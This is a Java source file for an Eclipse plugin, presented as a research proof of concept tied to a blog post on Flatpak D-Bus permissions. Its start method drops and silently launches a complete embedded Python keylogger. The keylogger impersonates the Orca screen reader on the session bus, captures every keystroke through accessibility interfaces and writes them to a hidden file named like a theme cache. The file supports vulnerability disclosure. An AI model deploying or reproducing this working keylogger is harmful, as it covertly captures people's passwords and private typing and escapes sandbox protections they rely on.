package com.linnemanlabs.poc;

import org.osgi.framework.BundleActivator;
import org.osgi.framework.BundleContext;
import java.io.*;
import java.nio.file.*;

/**
 * https://linnemanlabs.com/posts/hello-my-name-is-orca/
 *
 * PoC: Eclipse plugin that deploys a D-Bus keylogger.
 * Demonstrates that Flatpak session-bus permissions allow
 * plugins to capture keystrokes from outside the sandbox.
 *
 * For research purposes only
 */
public class Activator implements BundleActivator {

    private Process keyloggerProcess;

    private static final String KEYLOGGER_SCRIPT = """
            import gi
            gi.require_version('Gio', '2.0')
            from gi.repository import Gio, GLib
            import os, sys

            bus = Gio.bus_get_sync(Gio.BusType.SESSION)

            # Claim the Orca screen reader bus name
            result = bus.call_sync(
                'org.freedesktop.DBus', '/org/freedesktop/DBus',
                'org.freedesktop.DBus', 'RequestName',
                GLib.Variant('(su)', ('org.gnome.Orca.KeyboardMonitor', 0)),
                GLib.VariantType('(u)'), Gio.DBusCallFlags.NONE, -1, None)

            status = result.unpack()[0]
            if status != 1:
                sys.exit(1)

            # Start watching keyboard
            bus.call_sync(
                'org.freedesktop.a11y.Manager',
                '/org/freedesktop/a11y/Manager',
                'org.freedesktop.a11y.KeyboardMonitor', 'WatchKeyboard',
                None, None, Gio.DBusCallFlags.NONE, -1, None)

            log_path = os.path.join(os.environ.get('TMPDIR', '/tmp'), '.theme_cache.dat')

            def on_key(conn, sender, path, iface, signal, params):
                pressed, flags, keysym, charcode, scancode = params.unpack()
                if pressed:
                    return
                if charcode >= 32 and charcode < 127:
                    char = chr(charcode)
                elif keysym == 65293:
                    char = '\\n'
                elif keysym == 65288:
                    char = "[BS]"
                elif keysym == 65289:
                    char = "[TAB]"
                elif keysym == 65507 or keysym == 65508:
                    char = "[CTRL]"
                elif keysym == 65505 or keysym == 65506:
                    char = "[SHIFT]"
                elif keysym == 65513 or keysym == 65514:
                    char = "[ALT]"
                elif keysym == 65515:
                    char = "[SUPER]"
                else:
                    char = f"[{keysym}]"
                with open(log_path, 'a') as f:
                    f.write(char)

            bus.signal_subscribe(None, 'org.freedesktop.a11y.KeyboardMonitor',
                'KeyEvent', None, None, Gio.DBusSignalFlags.NONE, on_key)

            GLib.MainLoop().run()
            """;

    @Override
    public void start(BundleContext context) throws Exception {
        // Write the keylogger script to a temp file
        Path scriptPath = Files.createTempFile("eclipse_theme_", ".py");
        Files.writeString(scriptPath, KEYLOGGER_SCRIPT);
        scriptPath.toFile().deleteOnExit();

        // Launch it as a background process
        ProcessBuilder pb = new ProcessBuilder("python3", scriptPath.toString());
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        keyloggerProcess = pb.start();
    }

    @Override
    public void stop(BundleContext context) throws Exception {
        if (keyloggerProcess != null && keyloggerProcess.isAlive()) {
            keyloggerProcess.destroyForcibly();
        }
    }
}
